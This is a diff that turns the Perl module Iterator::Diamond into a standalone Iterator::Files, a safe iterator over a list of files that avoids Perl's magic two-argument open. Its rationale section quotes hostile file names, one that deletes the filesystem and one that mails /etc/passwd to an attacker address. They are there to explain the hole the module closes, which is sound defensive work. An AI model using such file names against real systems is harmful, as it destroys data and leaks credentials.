@@ -1,15 +1,14 @@
 #! perl
 
-package Iterator::Diamond;
+package Iterator::Files;
 
 use warnings;
 use strict;
 use Carp;
-use base qw(Iterator::Files);
 
 =head1 NAME
 
-Iterator::Diamond - Iterate through the files from ARGV
+Iterator::Files - Iterate through the contents of a list of files
 
 =cut
 
@@ -17,12 +16,12 @@ our $VERSION = '0.02';
 
 =head1 SYNOPSIS
 
-    use Iterator::Diamond;
+    use Iterator::Files;
 
-    $input = Iterator::Diamond->new;
+    $input = Iterator::Files->new( files => [ "foo", "bar" ] );
     while ( <$input> ) {
         ...
-        warn("Current file is $ARGV\n");
+        warn("current file = ", $it->current_file, "\n");
     }
 
     # Alternatively:
@@ -33,13 +32,13 @@ our $VERSION = '0.02';
 
 =head1 DESCRIPTION
 
-Iterator::Diamond provides a safe and customizable replacement for the
-C<< <> >> (Diamond) operator.
+Iterator::Files can be used to retrieve the contents of a series of
+files as if it were one big file, in the style of the C<< <> >>
+(Diamond) operator.
 
-Just like C<< <> >> it returns the records of all files specified in
-C<@ARGV>, one by one, as if it were one big happy file. In-place
-editing of files is also supported. It does use C<@ARGV>, C<$ARGV> and
-C<ARGVOUT> as documented in L<perlrun>, though without magic.
+Just like C<< <> >> it returns the records of all files, one by one,
+as if it were one big happy file. In-place editing of files is also
+supported..
 
 As opposed to the built-in C<< <> >> operator, no magic is applied to
 the file names unless explicitly requested. This means that you're
@@ -47,7 +46,7 @@ protected from file names that may wreak havoc to your system when
 processed through the magic of the two-argument open() that Perl
 normally uses for C<< <> >>.
 
-Iterator::Diamond is based on L<Iterator::Files>.
+Iterator::Files is part of the Iterator-Diamond package.
 
 =head1 RATIONALE
 
@@ -101,7 +100,7 @@ names like 'rm -fr / |' or '|mail < /etc/passwd badguy@evil.com' can
 be a severe threat to your system.
 
 After a long discussion on the perl mailing list it was felt that this
-security hole should be fixed. Iterator::Diamond does this by
+security hole should be fixed. Iterator::Files does this by
 providing a decent iterator that behaves just like C<< <> >>, but with
 safe semantics.
 
@@ -140,7 +139,7 @@ Using the perl command line option C<-I>I<suffix> has the same effect.
 
 =item B<< files => >> I<aref>
 
-Use this list of files instead of @ARGV.
+Use this list of files. If this is not specified, uses @ARGV.
 
 =back
 
@@ -148,9 +147,41 @@ Use this list of files instead of @ARGV.
 
 sub new {
     my ($pkg, %args) = @_;
-    my $self = $pkg->SUPER::new( files => \@ARGV, %args );
-    $self->{_current_file} = \$ARGV;
-    $self->{_edit} = $^I unless defined $self->{_edit};
+    my $self = bless
+      { _files => \@ARGV,
+	_magic => "none",
+	_init  => 0,
+      }, $pkg;
+
+    if ( exists $args{magic} ) {
+	$self->{_magic} = lc delete $args{magic};
+	croak($pkg."::new: Invalid value for 'magic' option")
+	  unless $self->{_magic} =~ /^none|all|stdin$/;
+    }
+    if ( exists $args{edit} ) {
+	$self->{_edit} = delete $args{edit};
+	croak($pkg."::new: Value for 'edit' option (backup suffix) may not be empty")
+	  if $self->{_edit} eq '';
+    }
+    if ( exists $args{files} ) {
+	$self->{_files} = delete $args{files};
+	croak($pkg."::new: Invalid value for 'files' option")
+	  unless ref $self->{_files} eq 'ARRAY';
+	$self->{_user_files} = 1;
+    }
+    if ( exists $args{record_separator} ) {
+	$self->{_recsep} = delete $args{record_separator};
+    }
+    if ( exists $args{rs} ) {
+	$self->{_recsep} = delete $args{rs};
+    }
+    if ( %args ) {
+	croak($pkg."::new: Unhandled options: "
+	      . join(" ", sort keys %args));
+    }
+
+    $self->{_current_file} = \my $argv;
+
     return $self;
 }
 
@@ -163,8 +194,34 @@ exhausted.
 
 =cut
 
+sub next {
+    my $self = shift;
+
+    while ( 1 ) {
+
+	unless ( $self->{_init} ) {
+	    return unless $self->_advance;
+	}
+
+	if ( $self->{_init} ) {
+	    my $line = readline($self->{_current_fh});
+	    return $line if defined $line;
+	    close($self->{_current_fh});
+	    undef($self->{_current_fh});
+	    $self->{_init} = 0;
+	    undef ${ $self->{_current_file} };
+	}
+    }
+}
+
 sub readline {
-    shift->SUPER::readline;
+    goto \&next unless wantarray;
+    my $self = shift;
+    my @lines;
+    while ( $self->has_next ) {
+	push(@lines, $self->next);
+    }
+    return @lines;
 }
 
 #### WARNING ####
@@ -174,14 +231,53 @@ use overload '<>' => \&readline;
 
 sub _advance {
     my $self = shift;
-    my $res = $self->SUPER::_advance;
-    return unless $res;
-    open(ARGV, '<&=', fileno($self->{_current_fh}));
-    if ( $self->{_edit} ) {
-	no warnings 'once';
-	open(ARGVOUT, '>&=', fileno($self->{_rewrite_fh}));
+
+    $self->{_init} = 1;
+
+    if ( $self->{_edit} && defined($self->{_rewrite_fh}) ) {
+	close($self->{_rewrite_fh})
+	  or croak("Error rewriting $self->current_file: $!");
+	undef $self->{_rewrite_fh};
+	select($self->{_reset_fh});
     }
-    return $res;
+
+    while ( 1 ) {
+
+	unless ( @{ $self->{_files} } ) {
+	    return;
+	}
+
+	${$self->{_current_file}} = shift(@{ $self->{_files} });
+
+	if ( $self->{_magic} eq 'all'
+	     || $self->{_magic} eq 'stdin' && $self->current_file eq '-' ) {
+	    open($self->{_current_fh}, $self->current_file)
+	      or croak("$self->current_file: $!");
+	}
+	else {
+	    open($self->{_current_fh}, '<', $self->current_file)
+	      or croak("$self->current_file: $!");
+	}
+
+	if ( $self->{_edit} ) {
+	    my $fname = $self->current_file;
+	    my $backup = $fname;
+	    if ( $self->{_edit} !~ /\*/ ) {
+		$backup .= $self->{_edit};
+	    }
+	    else {
+		$backup =~ s/\*/$fname/g;
+	    }
+	    unlink($backup);
+	    rename($fname, $backup)
+	      or croak("Cannot rename $fname to $backup: $!");
+	    open($self->{_rewrite_fh}, '>', $fname)
+	      or croak("Cannot create $fname: $!");
+	    $self->{_reset_fh} = select($self->{_rewrite_fh});
+	}
+
+	return -t $self->{_current_fh} || -s _;
+    }
 }
 
 =head2 has_next
@@ -195,6 +291,13 @@ This is the equivalent of the 'eof()' function.
 
 =cut
 
+sub has_next {
+    my $self = shift;
+    !$self->is_eof || $self->_advance;
+}
+
+#use overload 'bool' => \&has_next;
+
 =head2 is_eof
 
 Method, no arguments.
@@ -206,6 +309,11 @@ This is the equivalent of the 'eof' function.
 
 =cut
 
+sub is_eof {
+    my $fh = shift->{_current_fh};
+    !defined($fh) || eof($fh);
+}
+
 =head2 current_file
 
 Method, no arguments.
@@ -214,46 +322,11 @@ Returns the name of the current file being processed.
 
 =cut
 
-=head1 GLOBAL VARIABLES
-
-Since Iterator::Diamond is a plug-in replacement for the built-in C<<
-<> >> operator, it uses the same global variables as C<< <> >> for the
-same purposes.
-
-=over 4
-
-=item @ARGV
-
-The list of file names to be processed. When a new file is opened, its
-name is removed from the list.
-
-=item $ARGV
-
-The name of the file currently being processed. This can also be
-obtained by using the iterators C<current_file> method.
-
-=item $^I
-
-Enables in-place editing and, optionally, designates the backup suffix
-for edited files. See L<perlrun> for details.
-
-Setting C<$^I> to I<suffix> has the same effect as using the Perl
-command line argument C<-I>I<suffix> or using the C<edit=>I<suffix>
-option to the iterator constructor.
-
-=item ARGVOUT
-
-When in-place editing, this file handle is used to open the new,
-possibly modified, file to be written. This file handle is select()ed
-for standard output.
-
-=back
+sub current_file {
+    ${ shift->{_current_file} };
+}
 
 =head1 LIMITATIONS
-
-Perl's internal ARGV processing is very magical, and cannot be
-completely implemented in plain perl. However, the discrepancies
-should not be noticeable in normal situations.
 
 Even in list context, the iterator C<< <$input> >> is currently called
 only once and with scalar context. This will not work as expected:
@@ -266,7 +339,7 @@ This reads all remaining lines:
 
 =head1 SEE ALSO
 
-L<Iterator::Files>, open() in L<perlfun>, L<perlopentut>.
+L<Iterator::Diamond>, open() in L<perlfun>, L<perlopentut>.
 
 =head1 AUTHOR
 
@@ -284,7 +357,7 @@ progress on your bug as I make changes.
 
 You can find documentation for this module with the perldoc command.
 
-    perldoc Iterator::Diamond
+    perldoc Iterator::Files
 
 You can also look for information at:
 
@@ -319,22 +392,6 @@ under the same terms as Perl itself.
 
 =cut
 
-=begin maybe_later
-
-sub TIEHANDLE {
-    goto &new;
-}
-
-sub READLINE {
-    goto &readline;
-}
-
-tie *::ARGV, 'Iterator::Diamond';
-
-=end maybe_later
-
-=cut
-
-1; # End of Iterator::Diamond
+1; # End of Iterator::Files
 
 __END__
